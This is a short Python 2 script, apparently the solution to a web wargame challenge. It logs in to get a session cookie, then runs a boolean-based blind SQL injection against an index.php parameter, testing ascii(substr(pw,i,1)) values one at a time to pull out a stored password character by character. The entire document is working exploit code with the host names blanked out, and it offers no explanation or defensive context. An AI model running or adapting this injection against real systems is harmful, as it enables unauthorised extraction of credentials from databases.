#web challenge MtucX
import urllib, urllib2

req = urllib2.Request('http://........./', 'username=.....&pwd=.....')
res = urllib2.urlopen(req)
session = res.headers.get('Set-Cookie')

password=""
for i in range(1, 20):
	for j in range(97, 128):
		req = urllib2.Request('http://...../index.php?no=2%20and%20ascii(substr(pw,'+str(i)+',1))='+str(j)+'%23id=&pw=')
		req.add_header('cookie',session)
		res = urllib2.urlopen(req)
		if res.read().find('True') != -1:
			print chr(j)
			password+=chr(j)
			break
print password